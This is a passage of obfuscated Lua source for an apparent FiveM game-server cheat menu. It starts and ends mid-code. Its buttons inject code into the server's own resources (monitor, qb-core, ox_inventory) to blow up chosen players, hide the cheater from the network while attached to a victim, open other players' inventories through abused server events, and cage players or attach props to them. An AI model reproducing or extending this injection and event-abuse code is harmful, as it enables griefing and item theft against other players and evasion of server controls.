        ]],v339,v339,v339));MachoMenuNotification("Explode M2","Explosion sent to ID: "   .. v339 );else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v107=MachoMenuInputbox(v91,"Target Player ID (Explode M3)","e.g., 123");MachoMenuButton(v91,"S1 Explode Player Method 3",function() local v340=0;local v341;while true do if (v340==(0 -0)) then v341=tonumber(MachoMenuGetInputbox(v107));if (v341 and (v341>0)) then MachoMenuNotification("Explode M3","Exploding player ID: "   .. v341 );local v828=nil;if (GetResourceState("monitor")=="started") then v828="monitor";elseif (GetResourceState("qb-core")=="started") then v828="qb-core";elseif (GetResourceState("es_extended")=="started") then v828="es_extended";elseif (GetResourceState("m3-apartments")=="started") then v828="m3-apartments";elseif (GetResourceState("m3-inventory")=="started") then v828="m3-inventory";elseif (GetResourceState("m3-hud")=="started") then v828="m3-hud";elseif (GetResourceState("ox_inventory")=="started") then v828="ox_inventory";else v828="qb-core";end MachoInjectResource2(NewThreadNs,v828,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Explode M3: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M3:', 'Player not found! ID: %d' } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Explode M3: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M3:', 'Target player not in game!' } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Explode M3: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Explode M3:', 'You cannot target yourself!' } })
                return
            end
            
            print("Explode M3: Exploding " .. GetPlayerName(targetPlayer))
            
            local coords = GetEntityCoords(targetPed)
            AddOwnedExplosion(PlayerPedId(), coords.x, coords.y, coords.z, 10, 1.0, true, false, 1.0)
            
            local targetName = GetPlayerName(targetPlayer)
            print("Explode M3: Exploded " .. targetName)
            TriggerEvent('chat:addMessage', { args = { '^1Explode M3:', 'Exploded ' .. targetName .. ' Method 3' } })
        ]],v341,v341,v341));MachoMenuNotification("Explode M3","Explosion sent to ID: "   .. v341 );else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v108=false;local v109=false;local v110=nil;local v111=nil;local v112=nil;local v113=nil;local v114=nil;local v115=nil;local v14=false;local v15=false;local v116=false;local function v117(v342) local v343=0 -0 ;local v344;while true do if (v343==(388 -(212 + 176))) then v344=PlayerPedId();if v342 then local v829=905 -(250 + 655) ;while true do if (v829==(0 -0)) then SetEntityVisible(v344,false,false);NetworkSetEntityInvisibleToNetwork(v344,true);v829=1;end if ((1 -0)==v829) then SetEntityAlpha(v344,0 -0 ,false);v14=true;break;end end else SetEntityVisible(v344,true,false);NetworkSetEntityInvisibleToNetwork(v344,false);ResetEntityAlpha(v344);v14=false;end break;end end end CreateThread(function() while true do local v501=1956 -(1869 + 87) ;while true do if (v501==(0 -0)) then Wait(1901 -(484 + 1417) );if v14 then local v883=PlayerPedId();SetEntityLocallyVisible(v883);SetEntityAlpha(v883,255,false);end break;end end end end);local v118=MachoMenuInputbox(v91,"Follow ID","Target Player ID");MachoMenuButton(v91,"Follow/Leave",function() local v345=0 -0 ;local v346;local v347;local v348;local v349;while true do if (v345==3) then v111=v349;v114=GetEntityCoords(v348);MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        local playerVeh = GetVehiclePedIsIn(playerPed, false)

        -- Invisible to others
        SetEntityVisible(playerPed, false, false)
        NetworkSetEntityInvisibleToNetwork(playerPed, true)
        SetEntityAlpha(playerPed, 0, false)

        if playerVeh ~= 0 then
            SetEntityVisible(playerVeh, false, false)
            NetworkSetEntityInvisibleToNetwork(playerVeh, true)
            SetEntityAlpha(playerVeh, 0, false)
        end

        -- Visible to yourself
        SetEntityLocallyVisible(playerPed)
        SetEntityAlpha(playerPed, 255, false)

        if playerVeh ~= 0 then
            SetEntityLocallyVisible(playerVeh)
            SetEntityAlpha(playerVeh, 255, false)
        end
    ]]);v345=4;end if (v345==0) then if v109 then local v830=PlayerPedId();v109=false;DetachEntity(v830,true,false);v117(false);if DoesEntityExist(v111) then ClearPedTasks(v111);end v111=nil;if v114 then SetEntityCoords(v830,v114.x,v114.y,v114.z,false,false,false,false);end MachoInjectResource("monitor",[[
            local playerPed = PlayerPedId()
            local playerVeh = GetVehiclePedIsIn(playerPed, false)
    
            -- Make visible
            SetEntityVisible(playerPed, true, false)
            NetworkSetEntityInvisibleToNetwork(playerPed, false)
            ResetEntityAlpha(playerPed)
    
            if playerVeh ~= 0 then
                SetEntityVisible(playerVeh, true, false)
                NetworkSetEntityInvisibleToNetwork(playerVeh, false)
                ResetEntityAlpha(playerVeh)
            end
        ]]);v15=false;MachoMenuNotification("Follow","Follow left and returned.");return;end v346=tonumber(MachoMenuGetInputbox(v118));if ( not v346 or (v346<=(0 -0))) then MachoMenuNotification("Error","Please enter a valid ID!");return;end v345=774 -(48 + 725) ;end if (v345==4) then v15=true;AttachEntityToEntity(v348,v349,19302 -7486 ,0.5 -0 , -2,2 + 0 ,0 -0 ,0 + 0 ,0 + 0 ,false,false,false,false,854 -(152 + 701) ,true);CreateThread(function() while v109 do local v831=1311 -(430 + 881) ;while true do if (v831==1) then if v15 then local v957=0;local v958;while true do if (v957==(0 + 0)) then v958=PlayerPedId();SetEntityVisible(v958,false,false);v957=896 -(557 + 338) ;end if (v957==(1 + 1)) then SetEntityLocallyVisible(v958);SetEntityAlpha(v958,718 -463 ,false);break;end if (v957==1) then NetworkSetEntityInvisibleToNetwork(v958,true);SetEntityAlpha(v958,0,false);v957=6 -4 ;end end end break;end if (v831==0) then Wait(13 -8 );if IsPauseMenuActive() then v109=false;DetachEntity(v348,true,false);v117(false);if DoesEntityExist(v111) then ClearPedTasks(v111);end if v113 then SetEntityCoords(v348,v113.x,v113.y,v113.z,false,false,false,false);end v111=nil;MachoMenuNotification("Follow","Follow ended, returned to position.");end v831=2 -1 ;end end end end);break;end if (v345==1) then v347=GetPlayerFromServerId(v346);if (v347== -(802 -(499 + 302))) then MachoMenuNotification("Error","Player not found.");return;end v348=PlayerPedId();v345=868 -(39 + 827) ;end if ((5 -3)==v345) then v349=GetPlayerPed(v347);if  not DoesEntityExist(v349) then local v832=0 -0 ;while true do if ((0 -0)==v832) then MachoMenuNotification("Error","Target ped doesn't exist.");return;end end end v109=true;v345=3 -0 ;end end end);MachoMenuButton(v91,"Follow and Open Inventory / Leave",function() if v108 then local v550=PlayerPedId();v108=false;DetachEntity(v550,true,false);v117(false);if DoesEntityExist(v110) then ClearPedTasks(v110);end v110=nil;if v113 then SetEntityCoords(v550,v113.x,v113.y,v113.z,false,false,false,false);end SetEntityVisible(v550,true,false);NetworkSetEntityInvisibleToNetwork(v550,false);ResetEntityAlpha(v550);v116=false;MachoMenuNotification("Follow","Follow left and returned.");return;end local v350=tonumber(MachoMenuGetInputbox(v118));if ( not v350 or (v350<=(0 + 0))) then MachoMenuNotification("Error","Please enter a valid ID!");return;end local v351=GetPlayerFromServerId(v350);if (v351== -(2 -1)) then MachoMenuNotification("Error","Player not found.");return;end local v352=PlayerPedId();local v353=GetPlayerPed(v351);if  not DoesEntityExist(v353) then local v551=0 + 0 ;while true do if (v551==0) then MachoMenuNotification("Error","Target ped doesn't exist.");return;end end end v108=true;v110=v353;v113=GetEntityCoords(v352);SetEntityVisible(v352,false,false);NetworkSetEntityInvisibleToNetwork(v352,true);SetEntityAlpha(v352,0,false);v116=true;AttachEntityToEntity(v352,v353,11816,0.5 -0 ,104 -(103 + 1) ,554 -(475 + 79) ,0,0 -0 ,0,false,false,false,false,6 -4 ,true);local v354,v355="missminuteman_1ig_2","handsup_base";RequestAnimDict(v354);while  not HasAnimDictLoaded(v354) do Wait(0 + 0 );end TaskPlayAnim(v353,v354,v355,8 + 0 , -8, -1,1552 -(1395 + 108) ,0 -0 ,false,false,false);CreateThread(function() while v108 do Wait(5);if IsPauseMenuActive() then v108=false;DetachEntity(v352,true,false);v117(false);if DoesEntityExist(v110) then ClearPedTasks(v110);end if v113 then SetEntityCoords(v352,v113.x,v113.y,v113.z,false,false,false,false);end v110=nil;v116=false;MachoMenuNotification("Follow","Follow ended, returned to position.");end if v116 then local v782=PlayerPedId();SetEntityVisible(v782,false,false);NetworkSetEntityInvisibleToNetwork(v782,true);SetEntityAlpha(v782,1204 -(7 + 1197) ,false);SetEntityLocallyVisible(v782);SetEntityAlpha(v782,112 + 143 ,false);end end end);TriggerEvent("ox_inventory:openInventory","otherplayer",v350);end);MachoMenuButton(v91,"Open Nearby Player's Inventory (OX)",function() MachoInjectResource("m3-inventory",[[
        local function GetClosestPlayer()
            local closestPlayer = -1
            local closestDistance = -1
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if closestDistance == -1 or distance < closestDistance then
                        closestPlayer = playerId
                        closestDistance = distance
                    end
                end
            end

            return closestPlayer, closestDistance
        end

        local function ForceAnimationOnPlayer(ped)
            local dict = "dead"
            local anim = "dead_a"

            if not HasAnimDictLoaded(dict) then
                RequestAnimDict(dict)
                while not HasAnimDictLoaded(dict) do
                    Wait(10)
                end
            end

            TaskPlayAnim(ped, dict, anim, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local closestPlayer, distance = GetClosestPlayer()

        if closestPlayer ~= -1 and distance <= 2.0 then
            local targetPed = GetPlayerPed(closestPlayer)
            ForceAnimationOnPlayer(targetPed)
            TriggerEvent('m3-inventory:openInventory', 'otherplayer', GetPlayerServerId(closestPlayer))
        else
            TriggerEvent('chat:addMessage', { args = { '^1Inventory:', 'No nearby player found!' } })
        end
    ]]);end);MachoMenuButton(v91,"Open Nearby Player's Inventory (QB)",function() MachoInjectResource("monitor",[[
        local function GetClosestPlayer()
            local closestPlayer = -1
            local closestDistance = -1
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if closestDistance == -1 or distance < closestDistance then
                        closestPlayer = playerId
                        closestDistance = distance
                    end
                end
            end

            return closestPlayer, closestDistance
        end

        local closestPlayer, distance = GetClosestPlayer()

        if closestPlayer ~= -1 and distance <= 2.0 then
            local serverId = GetPlayerServerId(closestPlayer)
            -- Try QB inventory event
            TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", serverId)
            
            -- Show notification
            SetNotificationTextEntry("STRING")
            AddTextComponentString("~g~Opened inventory of nearby player!~w~ (ID: " .. serverId .. ")")
            DrawNotification(false, false)
        else
            SetNotificationTextEntry("STRING")
            AddTextComponentString("~r~No nearby player found!")
            DrawNotification(false, false)
        end
    ]]);end);local v119=MachoMenuInputbox(v91,"QB Player ID to Open","e.g., 123");MachoMenuButton(v91,"Open QB Player Inventory (By ID)",function() local v356=MachoMenuGetInputbox(v119);if (v356 and (v356~="")) then local v552=0 + 0 ;local v553;while true do if (v552==(319 -(27 + 292))) then v553=tonumber(v356);if (v553 and (v553>0)) then local v929=0 -0 ;while true do if (v929==(0 -0)) then MachoInjectResource("monitor",string.format([[
                TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", %d)
                
                SetNotificationTextEntry("STRING")
                AddTextComponentString("~g~Opened inventory for player ID: ~b~" .. %d)
                DrawNotification(false, false)
            ]],v553,v553));MachoMenuNotification("QB Inventory","Opening inventory for player ID: "   .. v553 );break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end else MachoMenuNotification("Error","Please enter a player ID!");end end);local v120=MachoMenuInputbox(v91,"Target Player ID (Attach Jet)","e.g., 123");MachoMenuButton(v91,"S1 Attach Jet",function() local v357=tonumber(MachoMenuGetInputbox(v120));if (v357 and (v357>(0 -0))) then local v554=0;local v555;while true do if (v554==0) then MachoMenuNotification("Attach Jet","Attaching jet to ID: "   .. v357 );v555=nil;v554=1 -0 ;end if (v554==1) then if (GetResourceState("monitor")=="started") then v555="monitor";elseif (GetResourceState("qb-core")=="started") then v555="qb-core";else v555="ox_inventory";end MachoInjectResource2(NewThreadNs,v555,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Attach Jet: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Jet:', 'Player not found! ID: ' .. targetServerId } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Attach Jet: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Jet:', 'Target player not in game! ID: ' .. targetServerId } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Attach Jet: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Jet:', 'You cannot target yourself!' } })
                return
            end
            
            local modelHash = GetHashKey("prop_med_jet_01")
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local obj = CreateObject(modelHash, GetEntityCoords(targetPed), true, true, true)
                AttachEntityToEntity(
                    obj,
                    targetPed,
                    12844,
                    0.0,
                    0.0,
                    0.25,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    true,
                    true,
                    false,
                    0,
                    true
                )
                SetModelAsNoLongerNeeded(modelHash)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Attach Jet: Attached jet to " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2Attach Jet:', 'Attached jet to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
            else
                print("Attach Jet: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Jet:', 'Failed to load object model!' } })
            end
        ]],v357));break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v121=MachoMenuInputbox(v91,"Target Player ID (Attach Box)","e.g., 123");MachoMenuButton(v91,"S1 Attach Box",function() local v358=tonumber(MachoMenuGetInputbox(v121));if (v358 and (v358>(0 -0))) then MachoMenuNotification("Attach Box","Attaching box to ID: "   .. v358 );local v556=nil;if (GetResourceState("monitor")=="started") then v556="monitor";elseif (GetResourceState("qb-core")=="started") then v556="qb-core";else v556="ox_inventory";end MachoInjectResource2(NewThreadNs,v556,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Attach Box: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Box:', 'Player not found! ID: ' .. targetServerId } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Attach Box: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Box:', 'Target player not in game! ID: ' .. targetServerId } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Attach Box: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Box:', 'You cannot target yourself!' } })
                return
            end
            
            local modelHash = GetHashKey("xm3_prop_xm3_box_wood03a")
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local obj = CreateObject(modelHash, GetEntityCoords(targetPed), true, true, true)
                AttachEntityToEntity(
                    obj,
                    targetPed,
                    12844,
                    0.0,
                    0.0,
                    0.25,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    true,
                    true,
                    false,
                    0,
                    true
                )
                SetModelAsNoLongerNeeded(modelHash)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Attach Box: Attached box to " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2Attach Box:', 'Attached box to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
            else
                print("Attach Box: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Box:', 'Failed to load object model!' } })
            end
        ]],v358));else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v122=MachoMenuInputbox(v91,"Target Player ID (Attach Cone)","e.g., 123");MachoMenuButton(v91,"S1 Attach Cone",function() local v359=139 -(43 + 96) ;local v360;while true do if ((0 -0)==v359) then v360=tonumber(MachoMenuGetInputbox(v122));if (v360 and (v360>0)) then local v833=0 -0 ;local v834;while true do if (v833==1) then if (GetResourceState("monitor")=="started") then v834="monitor";elseif (GetResourceState("qb-core")=="started") then v834="qb-core";else v834="ox_inventory";end MachoInjectResource2(NewThreadNs,v834,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Attach Cone: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Cone:', 'Player not found! ID: ' .. targetServerId } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Attach Cone: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Cone:', 'Target player not in game! ID: ' .. targetServerId } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Attach Cone: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Cone:', 'You cannot target yourself!' } })
                return
            end
            
            local modelHash = GetHashKey("prop_roadcone01b")
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local obj = CreateObject(modelHash, GetEntityCoords(targetPed), true, true, true)
                AttachEntityToEntity(
                    obj,
                    targetPed,
                    12844,
                    0.0,
                    0.0,
                    0.25,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    true,
                    true,
                    false,
                    0,
                    true
                )
                SetModelAsNoLongerNeeded(modelHash)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Attach Cone: Attached cone to " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2Attach Cone:', 'Attached cone to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
            else
                print("Attach Cone: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Cone:', 'Failed to load object model!' } })
            end
        ]],v360));break;end if (v833==0) then MachoMenuNotification("Attach Cone","Attaching cone to ID: "   .. v360 );v834=nil;v833=1 + 0 ;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v123=MachoMenuInputbox(v91,"Target Player ID (Attach Juke)","e.g., 123");MachoMenuButton(v91,"S1 Attach Juke Box",function() local v361=0;local v362;while true do if (v361==0) then v362=tonumber(MachoMenuGetInputbox(v123));if (v362 and (v362>(0 + 0))) then MachoMenuNotification("Attach Juke","Attaching juke box to ID: "   .. v362 );local v835=nil;if (GetResourceState("monitor")=="started") then v835="monitor";elseif (GetResourceState("qb-core")=="started") then v835="qb-core";else v835="ox_inventory";end MachoInjectResource2(NewThreadNs,v835,string.format([[
            local targetServerId = %d
            local targetPlayer = GetPlayerFromServerId(targetServerId)
            
            if not targetPlayer then
                print("Attach Juke: Player not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Juke:', 'Player not found! ID: ' .. targetServerId } })
                return
            end
            
            local targetPed = GetPlayerPed(targetPlayer)
            if not targetPed or not DoesEntityExist(targetPed) then
                print("Attach Juke: Target ped not found!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Juke:', 'Target player not in game! ID: ' .. targetServerId } })
                return
            end
            
            if targetPed == PlayerPedId() then
                print("Attach Juke: Cannot target self!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Juke:', 'You cannot target yourself!' } })
                return
            end
            
            local modelHash = GetHashKey("prop_jukebox_02")
            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 100 do
                Wait(10)
                timeout = timeout + 1
            end
            
            if HasModelLoaded(modelHash) then
                local obj = CreateObject(modelHash, GetEntityCoords(targetPed), true, true, true)
                AttachEntityToEntity(
                    obj,
                    targetPed,
                    12844,
                    0.0,
                    0.0,
                    0.25,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    true,
                    true,
                    false,
                    0,
                    true
                )
                SetModelAsNoLongerNeeded(modelHash)
                
                local targetName = GetPlayerName(targetPlayer)
                print("Attach Juke: Attached juke box to " .. targetName)
                TriggerEvent('chat:addMessage', { args = { '^2Attach Juke:', 'Attached juke box to ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
            else
                print("Attach Juke: Failed to load model!")
                TriggerEvent('chat:addMessage', { args = { '^1Attach Juke:', 'Failed to load object model!' } })
            end
        ]],v362));else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);function CagePlayer(v363) local v364=GetPlayerPed(v363);if ( not v364 or (v364<=(0 -0))) then local v557=0 + 0 ;while true do if (v557==0) then MachoMenuNotification("Error!","Invalid player ped.");return;end end end local v365=GetEntityCoords(v364);if  not v365 then MachoMenuNotification("Error!","Could not get player coordinates.");return;end local v366=IsPedInAnyVehicle(v364);if v366 then local v558=0 -0 ;local v559;local v560;while true do if (v558==(1 + 2)) then CreateObject(GetHashKey("prop_const_fence03b_cr"),v365.x-(0.6 + 0) ,v365.y-4.8 ,v365.z + (1752.3 -(1414 + 337)) ,false,true,true);v560=CreateObject(GetHashKey("prop_const_fence03b_cr"),v365.x + (1944.8 -(1642 + 298)) ,v365.y + (2 -1) ,v365.z + (2.3 -1) ,false,true,true);SetEntityHeading(v560,267 -177 );break;end if (v558==0) then v559=CreateObject(GetHashKey("prop_metal_detector"),v365.x-(2.8 + 4) ,v365.y + 1 + 0 ,v365.z-1.5 ,false,true,true);SetEntityHeading(v559,1062 -(357 + 615) );CreateObject(GetHashKey("prop_const_fence03b_cr"),v365.x-0.6 ,v365.y + 6.8 ,v365.z-(1.5 + 0) ,false,true,true);v558=2 -1 ;end if (v558==1) then CreateObject(GetHashKey("prop_const_fence03b_cr"),v365.x-0.6 ,v365.y-(4.8 + 0) ,v365.z-(2.5 -1) ,false,true,true);v560=CreateObject(GetHashKey("prop_const_fence03b_cr"),v365.x + 4.8 + 0 ,v365.y + 1 ,v365.z-(1.5 + 0) ,false,true,true);SetEntityHeading(v560,90);v558=2 + 0 ;end if (v558==(1303 -(384 + 917))) then v559=CreateObject(GetHashKey("prop_const_fence03b_cr"),v365.x-(703.8 -(128 + 569)) ,v365.y + (1544 -(1407 + 136)) ,v365.z + (1888.3 -(687 + 1200)) ,false,true,true);SetEntityHeading(v559,90);CreateObject(GetHashKey("prop_const_fence03b_cr"),v365.x-(1710.6 -(556 + 1154)) ,v365.y + (20.8 -14) ,v365.z + 1.3 ,false,true,true);v558=98 -(9 + 86) ;end end else local v561=421 -(275 + 146) ;local v562;local v563;local v564;local v565;local v566;local v567;local v568;local v569;while true do if (v561==6) then SetEntityHeading(v569,90);FreezeEntityPosition(v569,true);break;end if (v561==(1 + 2)) then FreezeEntityPosition(v565,true);v566=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x-(64.6 -(29 + 35)) ,v365.y-(4 -3) ,v365.z + (2.5 -1) ,true,true,true);FreezeEntityPosition(v566,true);v561=4;end if (v561==(17 -13)) then v567=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x-(0.55 + 0) ,v365.y-(1013.05 -(53 + 959)) ,v365.z + 1.5 ,true,true,true);SetEntityHeading(v567,90);FreezeEntityPosition(v567,true);v561=5;end if (v561==(408 -(312 + 96))) then v562=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x-(0.6 -0) ,v365.y-1 ,v365.z-(286 -(147 + 138)) ,true,true,true);FreezeEntityPosition(v562,true);v563=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x-(899.55 -(813 + 86)) ,v365.y-(1.05 + 0) ,v365.z-(1 -0) ,true,true,true);v561=1;end if (v561==(493 -(18 + 474))) then SetEntityHeading(v563,90);FreezeEntityPosition(v563,true);v564=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x-(0.6 + 0) ,v365.y + 0.6 ,v365.z-(3 -2) ,true,true,true);v561=1088 -(860 + 226) ;end if (v561==5) then v568=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x-0.6 ,v365.y + 0.6 ,v365.z + 1.5 ,true,true,true);FreezeEntityPosition(v568,true);v569=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x + 1.05 ,v365.y-1.05 ,v365.z + (304.5 -(121 + 182)) ,true,true,true);v561=6;end if (v561==(1 + 1)) then FreezeEntityPosition(v564,true);v565=CreateObject(GetHashKey("prop_fnclink_03gate5"),v365.x + (1241.05 -(988 + 252)) ,v365.y-(1.05 + 0) ,v365.z-(1 + 0) ,true,true,true);SetEntityHeading(v565,2060 -(49 + 1921) );v561=893 -(223 + 667) ;end end end end local v124=MachoMenuInputbox(v90,"Cage Target Player ID","e.g., 123");MachoMenuButton(v90,"Cage Player",function() local v367=0;local v368;while true do if (v367==0) then v368=tonumber(MachoMenuGetInputbox(v124));if (v368 and (v368>(52 -(51 + 1)))) then local v836=0 -0 ;while true do if (v836==(0 -0)) then MachoInjectResource("monitor",string.format([[
            local targetClientId = GetPlayerFromServerId(%d)
            if targetClientId == -1 then
                TriggerEvent('chat:addMessage', { args = { '^1Cage:', 'Player not found! ID: %d' } })
                return
            end
            local ped = GetPlayerPed(targetClientId)
            if not ped or ped <= 0 then
                TriggerEvent('chat:addMessage', { args = { '^1Cage:', 'Invalid player ped! ID: %d' } })
                return
            end
            local coords = GetEntityCoords(ped)
            if not coords then
                TriggerEvent('chat:addMessage', { args = { '^1Cage:', 'Could not get coordinates! ID: %d' } })
                return
            end
            local inveh = IsPedInAnyVehicle(ped)
            if inveh then
                local obj = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 6.8, coords.y + 1, coords.z - 1.5, false, true, true)
                SetEntityHeading(obj, 90.0)
                CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y + 6.8, coords.z - 1.5, false, true, true)
                CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y - 4.8, coords.z - 1.5, false, true, true)
                local obj2 = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x + 4.8, coords.y + 1, coords.z - 1.5, false, true, true)
                SetEntityHeading(obj2, 90.0)
                obj = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 6.8, coords.y + 1, coords.z + 1.3, false, true, true)
                SetEntityHeading(obj, 90.0)
                CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y + 6.8, coords.z + 1.3, false, true, true)
                CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y - 4.8, coords.z + 1.3, false, true, true)
                obj2 = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x + 4.8, coords.y + 1, coords.z + 1.3, false, true, true)
                SetEntityHeading(obj2, 90.0)
            else
                local obj = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z - 1, true, true, true)
                FreezeEntityPosition(obj, true)
                local obj2 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z - 1, true, true, true)
                SetEntityHeading(obj2, 90.0)
                FreezeEntityPosition(obj2, true)
                local obj3 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z - 1, true, true, true)
                FreezeEntityPosition(obj3, true)
                local obj4 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z - 1, true, true, true)
                SetEntityHeading(obj4, 90.0)
                FreezeEntityPosition(obj4, true)
                local obj5 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z + 1.5, true, true, true)
                FreezeEntityPosition(obj5, true)
                local obj6 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z + 1.5, true, true, true)
                SetEntityHeading(obj6, 90.0)
                FreezeEntityPosition(obj6, true)
                local obj7 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z + 1.5, true, true, true)
                FreezeEntityPosition(obj7, true)
                local obj8 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z + 1.5, true, true, true)
                SetEntityHeading(obj8, 90.0)
                FreezeEntityPosition(obj8, true)
            end
            TriggerEvent('chat:addMessage', { args = { '^2Cage:', 'Cage created! Player ID: %d' } })
